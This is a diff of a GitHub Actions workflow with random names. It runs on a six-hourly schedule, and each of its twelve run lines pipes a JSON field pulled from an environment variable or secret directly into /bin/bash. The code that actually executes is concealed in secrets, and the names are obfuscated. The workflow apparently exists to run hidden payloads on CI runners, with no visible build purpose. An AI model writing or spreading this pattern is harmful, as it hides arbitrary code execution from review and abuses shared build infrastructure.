@@ -2,20 +2,27 @@ name: taofeiji3489
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 5/6 * * *'
+    - cron: '49 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: taofeiji3489
         env:
-          g57: ${{ secrets.g57 }}
+          rr11: ${{ secrets.rr11 }}
         run: |
-          echo $g57 | jq -r .gyfa75 | /bin/bash
-          echo $v87522 | jq -r .q7 | /bin/bash
-          echo $keliu67565 | jq -r .vlmg698 | /bin/bash
-          echo $snf17 | jq -r .tvvrk3 | /bin/bash
-          echo $j5154 | jq -r .cdg91404 | /bin/bash
+          echo $rr11 | jq -r .vnk652 | /bin/bash
+          echo $vx12 | jq -r .vdix02995 | /bin/bash
+          echo $en7 | jq -r .jc0 | /bin/bash
+          echo $gcq9984 | jq -r .qodns459 | /bin/bash
+          echo $b95370 | jq -r .wuxi8 | /bin/bash
+          echo $xkciv97 | jq -r .s589 | /bin/bash
+          echo $hmjv98543 | jq -r .jlzaz8 | /bin/bash
+          echo $b418 | jq -r .znzjo57027 | /bin/bash
+          echo $pc58322 | jq -r .w48 | /bin/bash
+          echo $n25387 | jq -r .nuz65143 | /bin/bash
+          echo $lh9 | jq -r .fnv64 | /bin/bash
+          echo $xsy09 | jq -r .kg924 | /bin/bash
 
